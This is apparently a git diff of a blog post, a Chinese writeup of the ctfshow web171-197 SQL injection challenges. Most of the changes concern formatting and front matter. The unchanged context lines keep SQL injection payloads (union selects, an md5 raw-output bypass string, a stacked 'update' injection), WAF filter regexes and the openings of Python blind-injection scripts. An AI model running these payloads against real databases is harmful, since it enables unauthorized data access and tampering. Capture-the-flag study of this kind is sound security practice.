@@ -2,18 +2,35 @@
 title: "ctfshow Web入门[SQL注入] web171-197 Writeup"
 date: 2022-07-25T21:49:56+08:00
 draft: false
-tags: ['sqli','ctf','php']
-categories: ['web']
 author: "X1r0z"
 
-# weight: 1  # Top page
+tags: ['sqli','ctf','php']
+categories: ['web']
 
-# You can also close(false) or open(true) something for this content.
-# P.S. comment can only be closed
-comment: false
-toc: false
-autoCollapseToc: false
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: true
+ruby: true
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+math:
+  enable: false
+share:
+  enable: true
+comment:
+  enable: true
 ---
+
 
 肝不动了.... 休息会
 
@@ -27,7 +44,7 @@ autoCollapseToc: false
 
 ## web174
 
-```
+```php
 //检查结果是否有flag
     if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
       $ret['msg']='查询成功';
@@ -56,7 +73,7 @@ payload: `1' union select replace(replace(replace(replace(replace(replace(replac
 
 ## web175
 
-```
+```php
 //检查结果是否有flag
     if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
       $ret['msg']='查询成功';
@@ -73,7 +90,7 @@ payload: `1' union select replace(replace(replace(replace(replace(replace(replac
 
 脚本
 
-```
+```python
 import time
 import requests
 
@@ -143,7 +160,7 @@ for i in range(1,64):
 
 ## web181
 
-```
+```php
 //对传入的参数进行了过滤
   function waf($str){
     return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
@@ -210,7 +227,7 @@ tableName=`ctfshow_user`where`pass`like'ctfshow{%'
 
 盲注脚本
 
-```
+```python
 import requests
 
 dicts=r'1234567890-{}qwertyuiopasdfghjklzxcvbnm'
@@ -242,7 +259,7 @@ tableName=ctfshow_user group by pass having pass like 0xxxxxx
 
 脚本
 
-```
+```python
 import time
 import requests
 import binascii
@@ -305,7 +322,7 @@ floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*
 
 注意百分号
 
-```
+```python
 import time
 import requests
 
@@ -342,7 +359,7 @@ for i in range(1,64):
 
 ## web187
 
-```
+```php
 $password = md5($_POST['password'],true);
 ```
 
@@ -375,7 +392,7 @@ ffifdyop
 
 ## web188
 
-```
+```php
 $sql = "select pass from ctfshow_user where username = {$username}";
 ```
 
@@ -387,7 +404,7 @@ $sql = "select pass from ctfshow_user where username = {$username}";
 
 类似 PHP 的弱类型, 非数字开头的字符串 (如 admin flag 等) 转换后会变成0, 而 `0=0`, 从而可以查询到所有纪录
 
-```
+```php
 if($row['pass']==intval($password)) }{
     ......
 }
@@ -410,7 +427,7 @@ hint 为 "flag在api/index.php文件中"
 
 可以换成 `regexp` 正则匹配
 
-```
+```python
 import requests
 
 dicts='{1234567890-qwertyuiopasdfghjklzxcvbnm}'
@@ -453,7 +470,7 @@ pass 跑出来是 `admin`, 而且 `is_numberic()` 在这题里面不好绕过
 
 脚本
 
-```
+```python
 import time
 import requests
 
@@ -517,7 +534,7 @@ mysql 堆叠注入
 
 但是能用反引号 (加在表名和列名两侧)
 
-```
+```sql
 0;update`ctfshow_user`set`pass`=1
 ```
 
